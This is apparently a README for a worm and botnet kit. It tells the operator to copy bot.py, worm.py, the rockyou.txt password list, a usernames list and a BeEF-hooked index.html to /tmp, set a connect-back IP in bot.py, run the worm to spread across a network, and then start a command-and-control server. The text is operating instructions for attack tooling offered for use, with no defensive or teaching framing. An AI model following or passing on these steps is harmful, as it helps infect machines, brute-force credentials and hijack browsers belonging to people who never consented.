## Before continuing, please read the README(readme2) included from the Python3 CnC made by Leeon123(https://github.com/Leeon123/Python3-Botnet)



If you would like to use the BeEF hook, please edit the index.html with your own hook or you can use your own index.html file. Most things are interchangable, such as the usernames list, password list and index.html. You can use your own files instead. You can also use your own CnC as well, just change the name of the file to be uploaded to "bot.py". Make sure to keep the file name the same of whatever you swap.

---------
## After transfering/downloading the files to the network run the following command in the download folder:

***cp bot.py /tmp; cp index.html /tmp; cp rockyou.txt /tmp; cp usernames.txt /tmp; cp worm.py /tmp***
 
 -----

 After this, navigate to the ```/tmp``` directory, make sure you put the IP you want the machines to connect back to in the ```bot.py``` file as stated in Leeon123's readme and run ```./worm.py```

 Once the process is finished, you can run ```python3 cnc.py *port specified in bot.py * ``` to start the CnC server.
